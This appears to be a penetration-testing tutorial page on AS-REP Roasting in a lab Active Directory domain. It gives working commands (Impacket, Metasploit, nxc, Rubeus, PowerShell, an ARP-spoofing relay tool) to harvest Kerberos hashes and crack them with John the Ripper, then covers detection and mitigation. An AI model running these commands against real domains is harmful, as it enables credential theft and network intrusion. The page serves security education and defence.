@@ -1,0 +1,198 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">AS-REP Roasting</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/as-rep-roasting/" rel="bookmark"><time class="entry-date published" datetime="2020-05-10T15:33:00+00:00">May 10, 2020</time><time class="updated" datetime="2025-05-10T20:56:36+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p class="" data-start="152" data-end="532"><span style="color: #000000;">In this post, we delve into the exploitation of <strong data-start="200" data-end="221">Kerberos accounts</strong> with pre-authentication disabled, commonly known as <strong data-start="274" data-end="293">AS-REP Roasting</strong>. Specifically, this attack targets <strong data-start="329" data-end="346">user accounts</strong> in <strong data-start="350" data-end="375">Active Directory (AD)</strong> environments where <strong data-start="395" data-end="426">Kerberos pre-authentication</strong> is not enforced, which allows attackers to extract hashed credentials and potentially crack them offline.</span></p>
+<p class="" data-start="534" data-end="859"><span style="color: #000000;">Furthermore, the post outlines <strong data-start="565" data-end="578">lab setup</strong>, <strong data-start="580" data-end="604">exploitation methods</strong>, and <strong data-start="610" data-end="635">mitigation techniques</strong>, all mapped to the <strong data-start="655" data-end="681">MITRE ATT&amp;CK framework</strong> for clarity. Additionally, <strong data-start="709" data-end="733">detection mechanisms</strong> and actionable recommendations are provided to help security professionals identify and defend against this prevalent threat.</span></p>
+<h3><span style="color: #800000;">Table of Contents</span></h3>
+<p><strong><span style="color: #000000;">AS-REP Roasting</span></strong></p>
+<p><strong><span style="color: #000000;">Prerequisites</span></strong></p>
+<p><strong><span style="color: #000000;">Lab Setup</span></strong></p>
+<ul>
+<li>BloodyAD</li>
+<li>ldap_shell</li>
+</ul>
+<p><strong><span style="color: #000000;">Method for Exploitation – AS-REP Roasting Attack (T1558.004)</span></strong></p>
+<ul>
+<li><span style="color: #000000;">Impacket-GetNPUsers</span></li>
+<li><span style="color: #000000;">Metasploit</span></li>
+<li><span style="color: #000000;">Nxc</span></li>
+<li><span style="color: #000000;">ASREProast MitM</span></li>
+<li><span style="color: #000000;">Rubeus</span></li>
+</ul>
+<p><strong><span style="color: #000000;">Windows PowerShell – ASREPRoast</span></strong></p>
+<p><strong><span style="color: #000000;">Detection &amp; Mitigation</span></strong></p>
+<h3><span style="color: #800000;">AS-REP Roasting</span></h3>
+<p><span style="color: #000000;">AS-REP Roasting is an attack targeting the Kerberos authentication protocol. It exploits accounts where Kerberos pre-authentication is disabled, allowing attackers to crack passwords offline.</span></p>
+<p><span style="color: #000000;"><strong>How the Attack Works:</strong></span></p>
+<ol>
+<li><span style="color: #000000;"><strong>Request a Ticket:</strong> The attacker sends a request to the Key Distribution Center (KDC) for an account with pre-authentication disabled.</span></li>
+<li><span style="color: #000000;"><strong>Receive Encrypted Data:</strong> The KDC sends back an AS-REP response, encrypted using the account’s password hash.</span></li>
+<li><span style="color: #000000;"><strong>Crack the Password:</strong> The attacker uses tools to brute-force the password offline. If the password is weak, they gain access.</span></li>
+</ol>
+<p><span style="color: #000000;"><strong>Why Pre-Authentication Matters</strong></span></p>
+<p><span style="color: #000000;">Pre-authentication requires users to prove their identity before the KDC issues an AS-REP response. Without it attackers can request AS-REP responses without knowing the password.</span></p>
+<h3><span style="color: #800000;">Prerequisites</span></h3>
+<ul>
+<li><span style="color: #000000;">Windows Server 2019 as Active Directory</span></li>
+<li><span style="color: #000000;">Kali Linux</span></li>
+<li><span style="color: #000000;">Tools: Impacket, Metasploit, nxc, AsRepCatcher, ldap_shell, Powerview, Rubeus</span></li>
+<li><span style="color: #000000;">Windows 10/11 – As Client</span></li>
+</ul>
+<h3><span style="color: #800000;">Lab Setup</span></h3>
+<p><span style="color: #000000;">In this lab setup, we will create a user named ‘Yashika’ with Kerberos pre-authentication disabled, setting the stage for an AS-REP Roasting attack simulation.</span></p>
+<p><span style="color: #000000;"><strong>Create the AD Environment:</strong></span></p>
+<p><span style="color: #000000;">To simulate an Active Directory environment, you will need a Windows Server as a Domain Controller (DC) and a client machine (Windows or Linux) where you can run enumeration and exploitation tools.</span></p>
+<p><span style="color: #000000;"><strong>Domain Controller</strong>:</span></p>
+<ul>
+<li><span style="color: #000000;">Install Windows Server (2016 or 2019 recommended).</span></li>
+<li><span style="color: #000000;">Promote it to a Domain Controller by adding the <strong>Active Directory Domain Services</strong></span></li>
+<li><span style="color: #000000;">Set up the domain (e.g., <strong>local</strong>).</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>User Accounts</strong>:</span></p>
+<ul>
+<li><span style="color: #000000;">Create an AD user account named <strong>Yashika</strong>.</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user yashika Password@1 /add /domain</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3bELh1bDKoOQT4UOqq9XcnGbwashSvNgzCwIYFmJGncAAUaIYuFEgJ9UJrH39VJslVn9BNjLsTV1PEW_geJ2E7P2TkpqHXjme5w7Vlxd0Fnm7ZYttSvOCwTinRMf_XqpyjRm8CK7Z1m1s06DXDn0Kz_fQ_99BkrdUB5UXrZt_bnRD3v5Wu4C9AzHeFi4S/s16000/1.png"/></span></p>
+<p><span style="color: #000000;"><strong>Disable Kerberos preauthentication for Yashika User:</strong></span></p>
+<p><span style="color: #000000;">Once your AD environment is set up, you need to disable Kerberos preauthentication for <strong>Yashika</strong> user.</span></p>
+<p><span style="color: #000000;"><strong>Steps</strong>:</span></p>
+<ul>
+<li><span style="color: #000000;">Firstly, open <strong data-start="178" data-end="225">Active Directory Users and Computers (ADUC)</strong> on the <strong data-start="233" data-end="254">Domain Controller</strong>.</span></li>
+<li><span style="color: #000000;">Next, enable the <strong data-start="275" data-end="301" data-is-only-node="">Advanced Features view</strong> by clicking on <em data-start="317" data-end="343">View &gt; Advanced Features</em>.</span></li>
+<li><span style="color: #000000;">Then, locate the user named <strong data-start="375" data-end="386">Yashika</strong> in the <strong data-start="394" data-end="403">Users</strong> container.</span></li>
+<li><span style="color: #000000;">After that, right-click on the <strong data-start="448" data-end="464">Yashika user</strong> and select <em data-start="476" data-end="488">Properties</em>.</span></li>
+<li><span style="color: #000000;">Now, go to the <strong data-start="507" data-end="518">Account</strong> tab.</span></li>
+<li><span style="color: #000000;">In the <strong data-start="533" data-end="552">Account options</strong> section, check the box labeled <strong data-start="584" data-end="629">Do not require Kerberos preauthentication</strong>.</span></li>
+<li><span style="color: #000000;">Finally, apply the settings to complete the configuration.</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhgFiO_wRpI6H2wgR9PHte_8Ol_T_cYkr7yVPLgqJ8xfsZROdiJXs335KbMXVp5stGVfJKRMf01okUdvnqkaBGRrcU8-19p9mHdB3jXX9wXZRWESI_Y4y7m5xKPlZPmuZb-fPbe-YZR1zSvJivKkTo7hvc640SDMisfkIJW286VCM-r8tLs6vhsCu5ndbYO/s16000/2.png"/></span></p>
+<p><span style="color: #000000;"><strong>Alternate methods of lab setup </strong></span></p>
+<h3><span style="color: #800000;">BloodyAD</span></h3>
+<p><span style="color: #000000;">Alternatively, lab setup can be done with the help of BloodyAD, to disable preauthentication:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodyAD --host 192.168.1.48 -d ignite.local -u administrator -p Ignite@987 add uac yashika -f DONT_REQ_PREAUTH</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhogf0pvsYeFoKGnooNUMeqAAeNwXh4l8cX9MWLU77bPDSotjWgFtAXJ6pOpdedW_3DaXXGLlD414DoerpMbfAMP0OyVmTZfYo2o4ud4QEXHIy0aszdxpDFGnILWeYnTwMJY4WMKXHI47nJKzG8NdUqUb0-DUEOkaqLtLbWVsCnt3XBFkPuSbZ4bXYiOfDq/s16000/2_2.png"/></span></p>
+<p><span style="color: #000000;">Moreover, the following command will re-enable preauthentication:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodyAD --host 192.168.1.48 -d ignite.local -u administrator -p Ignite@987 remove uac yashika -f DONT_REQ_PREAUTH</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhEQ9lsvy97JjlfNzkF-jU8A6udLeEW3tBD03R2S6POZeVDOieCVkoNdahewPo1RnpS9V96HmVtM8p_epydgE0ZHlPRKEBpyF89rWfuL85eI6Ksb0VkXFBwUDg8Jt3vmS0Z7fE-gsxabnO2I_hfYtWZeDBZcRS92okpmpNWdaox7oPJWNd-uLz28xCJ-N-v/s16000/2_3.png"/></strong></span></p>
+<h3><span style="color: #800000;">ldap_shell</span></h3>
+<p><span style="color: #000000;">Alternatively, you can also achieve this using <strong data-start="643" data-end="657">ldap_shell</strong>. First, connect using:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ldap_shell ignite.local/administrator:Ignite@987 -dc-ip 192.168.1.48</pre>
+<p><span style="color: #000000;">To disable pre-authentication, run:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">set_dontreqpreauth yashika true</pre>
+<p><span style="color: #000000;">Finally, to re-enable pre-authentication:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">set_dontreqpreauth yashika false</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4zLW63jm1lskzL_bFUyIbusYWqtraBpPQtqHAi4mJj1sGsDd5-i4GbaILU9yyJIy-Kkh6XK13ORYbQ6z90UIjv7P6FOGbm_S8b1j36qjSSDSY5FPDHcvqJOSnQGH1rXXCj_bu6t3hpi0y0zZjxr07zdB79vemKwKMqZqdM7hk23GzTYigZLh-1GewTdA4/s16000/2_4.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<h3><strong><span style="color: #800000;">Method for Exploitation – AS-REP Roasting Attack (T1558.004)</span></strong></h3>
+<p><span style="color: #000000;">Attackers can exploit user accounts with Kerberos pre-authentication disabled by requesting encrypted credentials (AS-REP responses) and cracking them offline.</span></p>
+<h3><span style="color: #800000;">Impacket-GetNPUsers</span></h3>
+<p><span style="color: #000000;">The GetNPUsers script within Impacket can be used to perform AS-REP Roasting attacks and retrieve password hashes.</span></p>
+<p><span style="color: #000000;"><strong>With a user’s file</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-GetNPUsers -dc-ip 192.168.1.48 ignite.local/ -usersfile users.txt -format john -outputfile hashes</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiPdB6P474Oq4Q0NLA1GsGWBA7gRBR1mj6rBSq_PNFaORZ3-FN3jg30le35YpL7sXHOMdOz_IXshogmjr_zY_j940ZkXOsdelbv82AoV6NbU-aM8UqGh1llz0CfbTu3loRtHtUhSuBPNwBcfNAKlMFqTM8AFJeVJKxgLcJA4wrbnh324-otBthW94iI69_G/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">Further, with the help of John the Ripper dictionary such as Rockyou can help the attacker to extract the password from the hash.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">john -w=/usr/share/wordlists/rockyou.txt hashes</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_2_Yauhgg7aNrBu2SL1WFkzxozC_usgo8rQbu0LrulejAupZ3DREPH7XWOGX87IqV8RLYomgzSTkzio9lA4psUecFSok1ecsf0XVGzXGTIc4YROR1gCbIPF0eqaBN62vjuF-lg3EVM39i1yyf8_ITEWAuLRsYfqNAsowHQLuRe85aDxyRctaSKc41T7CC/s16000/4.png"/></span></p>
+<p><span style="color: #000000;"><strong>With a specific username</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-GetNPUsers ignite.local/yashika -dc-ip 192.168.1.48 -no-pass</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhJRpBKN9ZD7nOkJ29A-S_SlOfC9SdSdDDnKujituGUQaV6Oa-lcEnwGzPbtg2DcUmAhCHvYzd3nyGP3PGV_iotyUOGVILW1U2Bo9hqEF_Sze63WeMXc9MioAgTGea8-WrizeCPJpMvUojjtt8yvrIo2wqjfslJKi4mrv2pAVJ19quOit08Hc3lfjvYTOrU/s16000/5.png"/></span></p>
+<h3><span style="color: #800000;">Metasploit</span></h3>
+<p><span style="color: #000000;">This module searches for AD users without pre-auth required. Two different approaches are provided: – Brute force of usernames (does not require a user account; should not lock out accounts) – LDAP lookup (requires an AD user account).</span></p>
+<p><span style="color: #000000;"><strong>With a user’s file:</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/gather/asrep
+set rhosts 192.168.1.48
+set domain ignite.local
+set user_file users.txt
+run</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihw0UQuOlAFmJTvF2Id6npzUS8pKoJfNJPsRbaCAosYnq-mX5ovOIMk-yMEKDXem0g9N-jIFCWInzn8g9KyPn0063xNnP7QUP6PkajVzKqBZM-4XjNlLyhzn1LFlV4jO4XPuD-zAw1iYjwHhSZFdGOaBaFhr0ad6Fwzeey9U9Fa6HBAdtCBTCe83yVVjyF/s16000/6.png"/></strong></span></p>
+<p><span style="color: #000000;"><strong>With a specific username</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/gather/asrep
+set domain ignite.local
+set rhosts 192.168.1.48
+set username yashika
+run</pre>
+<p><span style="color: #000000;"><strong> </strong><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhZMgulRY2rVx7v7kdsRP6BvJZquNx1O7QFdp9BbyWz40LyIXv_CxEqktFO1176AjFp__hWK10RnWwJwP5M5ug4eBgH0QTFnG5JSv6LXnoYyrCZzcXGK4d9TU2MuRCBuH2XwJXSfCflwGt_LEazoQHu1Rer68YmSigIi9BSxEpzXIz3rltmmWXQIGyozhcY/s16000/7.png"/></strong></span></p>
+<h3><span style="color: #800000;">nxc</span></h3>
+<p><span style="color: #000000;">To check whether an account exists within Active Directory without Kerberos protocol, and is vulnerable to asreproast attack, follow these steps:</span></p>
+<p class="" data-start="279" data-end="302"><span style="color: #000000;">First, use the command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc ldap 192.168.1.48 -u "users.txt" -p '' -k</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9neF4sNkXFitr6pUR8Bb-uD59ffPuNxPkGBNsW_YCpZ6TUBw6McOJMezHamDWZrL5pPPVz8DXDfhicpKAMVO0Xi6HKWi0RGSzohJQCYdNq02b_FqjiAxr3DzYwvFpG8wMa5uu80eu6rKOmuAtAsEyVp-yzbvfmru7d-iRIHmJtuI1bege7JSDkpg2RXLS/s16000/7_2.png"/></span></p>
+<p class="" data-start="378" data-end="467"><span style="color: #000000;">Next, you can perform the <strong data-start="398" data-end="419">asreproast attack</strong> with a user’s file using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc ldap 192.168.1.48 -u "users.txt" -p '' --asreproast output.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgdXro6OzUhqhhve9wGyUIsxqVtyPn8xnIPlxzhsU0cjz1leDsFTWbyDXxM-1_OZs03MWothOiGbkxOeM5aUYLa-zn9kFS58nMlYR7UGW9p_-yNmR6eg73MXR_6t6wZd4kBZf06bnKVLjUD-p9T_9LwhCiD9BbM947b80erXDzflz5gHnYRfG2atde90AoG/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">Finally, for performing the <strong data-start="568" data-end="589">asreproast attack</strong> with a specific username, use this command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc ldap 192.168.1.48 -u yashika -p '' --asreproast result.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAzzQXILxPxFC12ED6oIyOCxEFxXEz4AEgPr4BSDilwHAq-TUva2zjRTKPeuR4RGx8Y6RRlmnxM8VKK8QkWQmn5zU5JkgB6BTyfSjrzX5U_wNb78y-NHafiEcdIMY4rotDSU5d3W17mhCTHPIo_QMkf1efg2AdnjnxxBQoaKtW05RmIP-4PV-wRbKBUQ9n/s16000/9.png"/></span></p>
+<h3><span style="color: #800000;">ASREProast MitM</span></h3>
+<p><span style="color: #000000;">ASRepCatcher uses ARP spoofing to catch AS-REP messages returned by the Domain Controller to the clients and prints out the hash to crack.</span></p>
+<p><span style="color: #000000;">Firstly, Clone the repository and install:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/Yaxxine7/ASRepCatcher.git
+cd AsRepCatcher
+python3 setup.py install</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDimwlrBN1kQwVHqHmrjH1P-yhsInVS2CFBg93_LAdwtX3VCqTePMVxBBS7t6-nIMOd6-jPUqSaSxQIn8u5tavuGAVaMa51HB99Pnl57uJos3Gx4CdPtv3cQ1eNZCr1fSwq0M-OagU0iLIdniu8GhBFY9kp3UyLaYB_E9Y_7rQA6vDwEHyEmmVMG7viU5L/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">Next, run the attack:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">AsRepCatcher relay -dc 192.168.1.48</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjkirU7Q57lzgeI52rgSXxCbngzpEWRwDBSaKrbIyxLYg318xjBVmbeIf0UWiXqXm46ZT3ejnN4giFb-rS9ZZ0ANWtOlyn0JSoATGLIXD9wRgNOz1QGipRId9W_XXEDV7kuMEHFVdQXHFVXIWIBEK4cmmgeAb975aCGNAA_2LiikYzJD8QaLpna56UxG97o/s16000/11.png"/></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjfROncOEmpAnXzDL_2SyxPFs8mtyVHaP_Vpjqh44xcIAAzUySiry_-Lts49q-t5c4RTPimn6eSUuKx3Pw3VBkGfsv0xb0UhrsnJdYxLNR6jL5a4egvlnjQZyZ7qlDktIHx5OJLVcHks_ccxkjiH5L6N43BUsdNzx7cI6YT6J8NDAwXh9SifjAkn-4Fe7Q8/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">Then, Crack the hashes:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">john –format=krb5asrep -w=/usr/share/wordlists/rockyou.txt asrep_hashes.txt</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjvIiD3AUpfku66Oc8aifc3xKiPOW6eqvwBVKekHc6LTdwv8Lwue6Z2dPE7wJSJ7tiHS-pf8ZKMFQrUiuYdeNrzYkBGOtc3N4lIAur75d3JTtq92zAKMyeILUMk8kWCRtegL1sYDpiQ18J7Oxr1ExjQKVt6VIpt-BeddtKboQ2EfsseljtghkkDTE1uDiiA/s16000/14.png"/></strong></span></p>
+<p><span style="color: #000000;"><strong>Windows </strong></span></p>
+<h3><span style="color: #800000;">Rubeus</span></h3>
+<p><span style="color: #000000;">Rubeus is a powerful post-exploitation tool that attackers can use to interact with Kerberos tickets and perform AS-REP Roasting attacks. It allows attackers to request service tickets for accounts with pre-authentication disabled.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Rubeus.exe asreproast /format:john /outfile:hash.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsm-S2zXkNGTwuMEqW_-T2uYED4dOKsiSuD4whi-s03eVYTMi4RUoU0ZKiMjvDO7qHPHNY-SnUrOqle2JzjJR1l5-9l3znET3ISkRVmGVhRIEiEaHl6zluT2yXDOfysLWExBjgFIdFxsX04RGmL_U9d7G47HPDmdsvcmoUnVT2CsVHgMyeU5r6Hh0IrJwu/s16000/50.png"/></span></p>
+<h3><span style="color: #800000;">Windows PowerShell – ASREPRoast</span></h3>
+<p><span style="color: #000000;">The attacker can perform asreproasting using <strong>ASREPRoast PowerShell script</strong> module.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -ep bypass
+Import-Module .\ASREPRoast.ps1
+Invoke-ASREPRoast
+Invoke-ASREPRoast | select -ExpandProperty Hash &gt; hashdump</pre>
+<p><span style="color: #000000;"><strong> </strong><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9_0XKl_WQOYUTfOEsybjHdmlt12FdANnUwuiJn-OpxYXD1QF52u-54wdZ4cxmS85w_K6H5FXmNvWom6Tz6sc9DwdixKGoUy0kuO0riidBmZZ7zqrG9T0bUS-Kt1m202Nj6AReriZer7_YUuCEeflaxrFqnQbQDHaBgJMLAZ4rWV0upwbMAI9pYhDwaWw9/s16000/51.png"/></strong></span></p>
+<h3><span style="color: #800000;">Detection &amp; Mitigation</span></h3>
+<p><span style="color: #000000;"><strong>Detection</strong></span></p>
+<p><span style="color: #000000;">Detecting AS-REP Roasting attacks is important to prevent password theft.</span></p>
+<p><span style="color: #000000;"><strong>Event ID 4768</strong>, recorded in the Security Logs on the domain controller, is triggered whenever a Kerberos authentication ticket is requested. Key details to look for in this event include:</span></p>
+<ul>
+<li><span style="color: #000000;">Ticket Encryption Type: Often 0x17 (RC4 encryption).</span></li>
+<li><span style="color: #000000;">Pre-Authentication Type: If it is 0, it indicates that preauthentication is disabled, a condition targeted by AS-REP Roasting attacks.</span></li>
+<li><span style="color: #000000;">Service Name: Typically, krbtgt (Kerberos Ticket-Granting Ticket).</span></li>
+</ul>
+<p><span style="color: #000000;">If you see these parameters in your logs, it might signal an AS-REP Roasting attack, as attackers generate these events while tampering with domain accounts. Regularly reviewing logs for these signs can help detect and mitigate this threat.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjoGXHr1hXptU4c4QmSwNGXQCH0FL0C4zVdr9S3M1eTcodBJNFaso-qxPWLW0yQMAcaJyvE_z5oDfINdIQ0DpIWgJKTramexAf62BkefsY2Vm5cRoQ7l0agvtn63KKMiF8pR_ORIq537-QfsBqtYLF618RNwkPWE9iy2Ip9oiSguWzPoswX7Ab6U7AKLiWh/s16000/100.png"/></strong></span></p>
+<p><span style="color: #000000;"><strong>Mitigation</strong></span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Enable Pre-Authentication:</strong> Ensure the “Do not require Kerberos pre-authentication” setting is disabled for all accounts.</span></li>
+<li><span style="color: #000000;"><strong>Use Strong Passwords:</strong> Enforce complex, unique passwords and regularly update them.</span></li>
+<li><span style="color: #000000;"><strong>Disable RC4-HMAC:</strong> Transition to stronger encryption types like AES128 (0x11) or AES256 (0x12) through Group Policy.</span></li>
+<li><span style="color: #000000;"><strong>Monitor Logs:</strong> Monitor the less secure encryption type such as 0x1 &amp; 0x3 (DES) 0x17 &amp; 0x18 (Rc4).</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRn2it-bHpbwLxhXKxaX52vtVWNyREKfaCOMThFk89ZYuSSLmomszzbbw66EgWS1VDyGQm6oJVgxVg2GnhmszH2uiK9ew_dwj7GvxhagTSD1vgTFGvBX4v6dHx3VQmdqT3hHGiOo0Pf6Y-GfxzowBK0bLQNkzhWAWrQTTFJ7ZhnSuRz-ZPLQWan_7Zzq-W/s16000/101.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Komal Singh is a Cyber Security Researcher and Technical Content Writer, she is a completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact </span><a href="https://www.linkedin.com/in/komal--rajput/"><strong>Here</strong></a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
+<!-- YARPP Thumbnails -->
+<h3>Related posts:</h3>
+<div class="yarpp-thumbnails-horizontal">
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/process-ghosting-attack/" title="Process Ghosting Attack">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Process Ghosting Attack</span></a>
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/a-detailed-guide-on-rubeus/" title="A Detailed Guide on Rubeus">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">A Detailed Guide on Rubeus</span></a>
+</div>
+</div>
+            </div><!-- .entry-content -->
+            <footer class="post-footer entry-footer">
+                                                
+            </footer><!-- .entry-footer -->
+            
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/lateral-moment-on-active-directory-crackmapexec/" rel="prev">Lateral Movement on Active Directory: CrackMapExec</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/hack-the-box-open-admin-box-walkthrough/" rel="next">HacktheBox OpenAdmin Walkthrough</a></div></div>
+	</nav>        </div>
